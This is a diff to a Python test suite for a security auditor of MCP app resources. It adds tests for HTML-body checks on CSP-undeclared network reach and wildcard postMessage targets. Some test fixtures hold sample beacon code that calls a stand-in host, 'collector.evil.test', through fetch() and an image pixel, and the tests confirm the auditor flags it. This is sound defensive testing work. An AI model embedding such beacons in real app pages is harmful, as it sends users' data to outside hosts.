@@ -18,9 +18,15 @@ _DISCOVER = {
 
 
 class _Transport:
-    def __init__(self, tools: list[dict[str, Any]], resources: list[dict[str, Any]]) -> None:
+    def __init__(
+        self,
+        tools: list[dict[str, Any]],
+        resources: list[dict[str, Any]],
+        documents: dict[str, str] | None = None,
+    ) -> None:
         self.tools = tools
         self.resources = resources
+        self.documents = documents or {}
         self.emit_routing_headers = False
         self.protocol_version: str | None = None
         self.supports_headers = False
@@ -34,6 +40,15 @@ class _Transport:
             return JsonRpcResponse(id=body.get("id"), result={"tools": self.tools})
         if method == "resources/list":
             return JsonRpcResponse(id=body.get("id"), result={"resources": self.resources})
+        if method == "resources/read":
+            uri = (body.get("params") or {}).get("uri", "")
+            html = self.documents.get(uri)
+            if html is None:
+                return JsonRpcResponse(id=body.get("id"), error={"code": -32002, "message": "Not found"})
+            return JsonRpcResponse(
+                id=body.get("id"),
+                result={"contents": [{"uri": uri, "mimeType": APP_MIME_TYPE, "text": html}]},
+            )
         return JsonRpcResponse(id=body.get("id"), error={"code": -32601, "message": "Method not found"})
 
     def send_with_extra_headers(self, req: Any, overrides: dict[str, str]) -> JsonRpcResponse:
@@ -64,8 +79,12 @@ def _resource(
     return entry
 
 
-def _audit(tools: list[dict[str, Any]], resources: list[dict[str, Any]]) -> list[Any]:
-    client = McpClient(_Transport(tools, resources))
+def _audit(
+    tools: list[dict[str, Any]],
+    resources: list[dict[str, Any]],
+    documents: dict[str, str] | None = None,
+) -> list[Any]:
+    client = McpClient(_Transport(tools, resources, documents))
     client.connect()
     return audit_apps(client)
 
@@ -149,3 +168,59 @@ def test_runtime_carries_the_findings_into_the_report() -> None:
     assert "app_surface" in checks
     reach = next(r for r in rows if r["check"] == "app_ui_reach")
     assert reach["severity"] == "HIGH"
+
+
+_URI = "ui://clock/app.html"
+
+
+def _html_audit(html: str, csp: dict[str, Any] | None = _SANE_CSP) -> list[Any]:
+    return _audit([_tool()], [_resource(csp=csp)], {_URI: html})
+
+
+def test_a_document_that_stays_where_it_declared_is_not_a_finding() -> None:
+    """Relative references resolve against the host's own origin and reach nowhere new."""
+    html = (
+        "<html><head><script src='./app.js'></script>"
+        "<link href='https://cdn.clock.test/style.css'></head>"
+        "<body><script>fetch('https://api.clock.test/now')</script></body></html>"
+    )
+    assert [f.check for f in _html_audit(html)] == ["app_surface"]
+
+
+def test_a_reach_outside_the_declaration_is_medium() -> None:
+    """A compliant host blocks it, so this is a discrepancy rather than proven egress."""
+    html = "<script>fetch('https://collector.evil.test/beacon')</script>"
+    reach = next(f for f in _html_audit(html) if f.check == "app_html_reach")
+    assert reach.severity == "MEDIUM"
+    assert "collector.evil.test" in reach.detail
+
+
+def test_a_reach_with_no_declaration_at_all_is_high() -> None:
+    """With no CSP nothing blocks the request, and the document does make it."""
+    html = "<img src='https://collector.evil.test/pixel.png'>"
+    reach = next(f for f in _html_audit(html, csp=None) if f.check == "app_html_reach")
+    assert reach.severity == "HIGH"
+
+
+def test_a_wildcard_declaration_covers_its_subdomains() -> None:
+    html = "<script src='https://assets.clock.test/app.js'></script>"
+    findings = _html_audit(html, csp={"resourceDomains": ["https://*.clock.test"]})
+    assert [f for f in findings if f.check == "app_html_reach"] == []
+
+
+def test_a_wildcard_target_origin_on_postmessage_is_reported() -> None:
+    html = "<script>window.parent.postMessage({tool: 'x'}, '*')</script>"
+    channel = next(f for f in _html_audit(html) if f.check == "app_html_channel")
+    assert channel.severity == "MEDIUM"
+
+
+def test_a_targeted_postmessage_is_left_alone() -> None:
+    """The ordinary call names its parent; firing on it would flag every app."""
+    html = "<script>window.parent.postMessage({tool: 'x'}, 'https://client.test')</script>"
+    assert [f for f in _html_audit(html) if f.check == "app_html_channel"] == []
+
+
+def test_an_unreadable_document_produces_no_body_findings() -> None:
+    """The declaration audit still runs; the body simply was not seen."""
+    findings = _audit([_tool()], [_resource(csp=_SANE_CSP)], {})
+    assert [f for f in findings if f.check.startswith("app_html")] == []
